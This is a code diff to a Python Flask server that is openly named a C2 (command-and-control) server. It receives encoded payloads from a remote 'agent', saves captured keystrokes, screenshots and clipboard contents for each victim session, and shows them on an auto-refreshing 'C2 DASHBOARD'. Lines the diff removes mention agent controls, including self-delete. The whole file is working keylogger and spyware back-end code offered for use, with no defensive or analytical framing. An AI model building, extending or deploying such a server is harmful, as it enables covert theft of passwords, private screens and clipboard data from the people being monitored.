@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory, Response
 import base64
 import zlib
 import json
@@ -7,53 +7,52 @@ import datetime
 
 app = Flask(__name__)
 
-# Ensure directories exist
 BASE_DIR = "c2_data"
 for folder in ["logs", "keys", "screenshots"]:
     os.makedirs(f"{BASE_DIR}/{folder}", exist_ok=True)
 
 def decrypt_payload(data_b64):
-    """Simple decrypt matching agent"""
+    """Decode agent payload"""
     try:
-        # Just decompress + parse (agent uses JSON now)
         data_bytes = base64.b64decode(data_b64)
         decompressed = zlib.decompress(data_bytes).decode('utf-8')
         return json.loads(decompressed)
     except Exception as e:
-        print(f"Decrypt error: {e}")
+        print(f"❌ Decrypt failed: {e}")
         return None
 
 @app.route("/receive", methods=["POST"])
 def receive():
     try:
-        # Get encrypted data
+        if not request.is_json:
+            return jsonify({"error": "JSON required"}), 400
+            
         payload_encrypted = request.json.get("data")
         if not payload_encrypted:
-            return jsonify({"error": "No data"}), 400
+            return jsonify({"error": "No data field"}), 400
         
-        # Decrypt
         payload = decrypt_payload(payload_encrypted)
         if not payload:
-            return jsonify({"error": "Decrypt failed"}), 400
+            return jsonify({"error": "Payload decode failed"}), 400
         
-        # Save files
         session_id = payload.get("session_id", payload.get("hostname", "unknown"))
+        keys = payload.get("keys", "")
+        shots = payload.get("screenshot_data", [])
+        clipboard = payload.get("clipboard", "")
         ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         
-        # JSON log
+        # Save JSON log
         log_file = f"{BASE_DIR}/logs/{session_id}_{ts}.json"
         with open(log_file, "w") as f:
             json.dump(payload, f, indent=2)
         
-        # Keylog
-        keys = payload.get("keys", "")
-        if keys:
+        # Save keys
+        if keys and keys != ".":
             keys_file = f"{BASE_DIR}/keys/{session_id}_{ts}.txt"
             with open(keys_file, "w", encoding="utf-8") as f:
                 f.write(keys)
         
-        # Screenshots
-        shots = payload.get("screenshot_data", [])
+        # Save screenshots
         saved_shots = 0
         for shot in shots:
             try:
@@ -62,25 +61,25 @@ def receive():
                 with open(shot_file, "wb") as f:
                     f.write(img_data)
                 saved_shots += 1
-            except:
-                pass
+            except Exception as e:
+                print(f"❌ Shot save error: {e}")
         
-        print(f"✅ {session_id}: {len(keys)} keys, {saved_shots} shots")
+        print(f"✅ [{session_id}] {len(keys)}ch keys, {saved_shots} shots")
+        
+        # EXACT client-expected format
         return jsonify({
-            "status": "ok", 
-            "keys": len(keys), 
+            "keys_len": len(keys) if keys else 0,
             "shots": saved_shots,
-            "clipboard": len(payload.get("clipboard", []))
-        })
+            "status": "ok"
+        }), 200
         
     except Exception as e:
-        print(f"ERROR: {e}")
+        print(f"❌ SERVER ERROR: {e}")
         return jsonify({"error": str(e)}), 500
 
 @app.route("/")
 def dashboard():
     try:
-        # Get latest files
         shots = sorted([f for f in os.listdir(f"{BASE_DIR}/screenshots") if f.endswith('.png')], reverse=True)[:12]
         keylogs = sorted([f for f in os.listdir(f"{BASE_DIR}/keys") if f.endswith('.txt')], reverse=True)[:10]
         
@@ -100,7 +99,7 @@ def dashboard():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔥 C2 Dashboard</title>
+    <title>🔥 C2 DASHBOARD</title>
     <meta name="viewport" content="width=device-width">
     <style>
         *{{margin:0;padding:0;box-sizing:border-box}}
@@ -117,17 +116,17 @@ def dashboard():
         .keylog{{padding:12px;margin:8px 0;background:#000;border-radius:5px;cursor:pointer;transition:background 0.2s}}
         .keylog:hover{{background:#0a0a0a}}
         .keylog a{{color:#0f0;text-decoration:none}}
-        .controls{{text-align:center;margin-top:30px;padding:20px;background:#111;border-radius:10px}}
-        @media(max-width:768px){{.stats{{flex-direction:column;gap:20px}}.shots-grid{{grid-template-columns:1fr}}}}
+        .live{{animation:pulse 2s infinite}}
+        @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.5}}}}
     </style>
 </head>
 <body>
     <div class="header">
         <h1>🔥 C2 DASHBOARD</h1>
         <div class="stats">
-            <div>📸 {len(shots)} Screenshots</div>
-            <div>⌨️ {len(keylogs)} Keylogs</div>
-            <div>🟢 LIVE</div>
+            <div>📸 <span id="shotcount">{len(shots)}</span> Shots</div>
+            <div>⌨️ <span id="keycount">{len(keylogs)}</span> Logs</div>
+            <div class="live">🟢 LIVE</div>
         </div>
     </div>
     
@@ -140,19 +139,16 @@ def dashboard():
         {keys_html}
     </div>
     
-    <div class="controls">
-        <h3>🎮 CONTROLS</h3>
-        <p><strong>Ctrl+Alt+Q</strong> = 🛑 Stop Agent</p>
-        <p><strong>ESC</strong> = 💥 Self-Delete</p>
-        <p>Last update: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")}</p>
-    </div>
+    <script>
+        setTimeout(()=>location.reload(), 30000);
+    </script>
 </body>
 </html>
         """
         return html
         
     except Exception as e:
-        return f"<h1>Dashboard Error: {e}</h1>", 500
+        return f"<pre style='color:#f00'>Dashboard Error: {e}</pre>", 500
 
 @app.route("/shots/<path:filename>")
 def serve_shot(filename):
@@ -168,8 +164,6 @@ def serve_key(filename):
         if os.path.exists(filepath):
             with open(filepath, "r", encoding="utf-8") as f:
                 content = f.read()
-            
-            # Escape HTML
             content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
             content = content.replace('\n', '<br>').replace(' ', '&nbsp;')
             
@@ -186,14 +180,10 @@ pre{{background:#111;padding:30px;border-radius:15px;border:2px solid #333;max-h
 </body></html>
             """
         return "File not found", 404
-    except Exception as e:
-        return f"Error: {e}", 500
-
-@app.errorhandler(500)
-def internal_error(error):
-    return "Server error - check logs", 500
+    except:
+        return "Error", 500
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    print(f"🚀 Server running on port {port}")
-    app.run(host="0.0.0.0", port=port, debug=False)
+    print(f"🚀 C2 Server LIVE on :{port}")
+    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
